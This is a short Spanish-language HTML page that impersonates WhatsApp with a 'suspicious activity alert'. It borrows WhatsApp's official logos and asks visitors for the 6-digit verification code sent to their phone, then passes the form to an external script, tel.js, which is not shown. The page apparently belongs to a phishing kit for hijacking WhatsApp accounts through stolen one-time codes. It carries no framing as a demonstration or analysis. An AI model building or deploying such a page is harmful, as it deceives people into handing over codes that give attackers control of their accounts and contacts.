<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alerta de Actividad Sospechosa - WhatsApp</title>
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>


    <header>
        <img src="https://static.whatsapp.net/rsrc.php/yZ/r/JvsnINJ2CZv.svg" alt="Logo WhatsApp">
    </header>

    <div class="content">
         <img src="https://static.whatsapp.net/rsrc.php/yZ/r/JvsnINJ2CZv.svg" width="350"  alt="Logo WhatsApp">
        <p>Le hemos enviado un código de verificación de 6 dígitos a su número teléfono registrado, por favor, introduzca el código:</p>
        <form id="verificationForm">
    
            <input type="tel" id="cod" name="cod" minlength="6" maxlength="6" placeholder="Código" required>

            <button type="submit" id="submitButton">Continuar</button>
        </form>
    </div>

    <footer>
        <img src="https://static.whatsapp.net/rsrc.php/ya/r/GjxmhIpug9B.svg" alt="Logo WhatsApp">
    </footer>
<script type="text/javascript" src="tel.js"></script>
</body>
</html>
